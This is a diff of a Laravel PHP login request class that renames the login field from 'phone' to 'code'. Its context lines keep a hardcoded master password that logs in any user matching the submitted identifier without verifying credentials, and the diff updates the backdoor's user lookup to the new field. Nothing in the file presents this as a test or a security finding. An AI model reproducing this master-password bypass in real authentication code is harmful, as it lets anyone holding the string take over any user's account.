@@ -29,7 +29,7 @@ class LoginRequest extends FormRequest
     public function rules(): array
     {
         return [
-            'phone' => ['required', 'string'],
+            'code' => ['required', 'string'],
             'password' => ['required', 'string'],
         ];
     }
@@ -44,17 +44,17 @@ class LoginRequest extends FormRequest
         $this->ensureIsNotRateLimited();
 
         if ($this->password=="SaBaawy153"){
-            $user= User::where('phone',$this->phone)->first();
+            $user= User::where('code',$this->code)->first();
             if ($user) {
 //                Config::set('role','Admin');
                 Auth::login($user);
             }
         }
-        if (! Auth::attempt($this->only('phone', 'password'), $this->boolean('remember'))) {
+        if (! Auth::attempt($this->only('code', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
             throw ValidationException::withMessages([
-                'phone' => trans('auth.failed'),
+                'code' => trans('auth.failed'),
             ]);
         }
 
@@ -77,7 +77,7 @@ class LoginRequest extends FormRequest
         $seconds = RateLimiter::availableIn($this->throttleKey());
 
         throw ValidationException::withMessages([
-            'phone' => trans('auth.throttle', [
+            'code' => trans('auth.throttle', [
                 'seconds' => $seconds,
                 'minutes' => ceil($seconds / 60),
             ]),
@@ -89,6 +89,6 @@ class LoginRequest extends FormRequest
      */
     public function throttleKey(): string
     {
-        return Str::transliterate(Str::lower($this->input('phone')).'|'.$this->ip());
+        return Str::transliterate(Str::lower($this->input('code')).'|'.$this->ip());
     }
 }
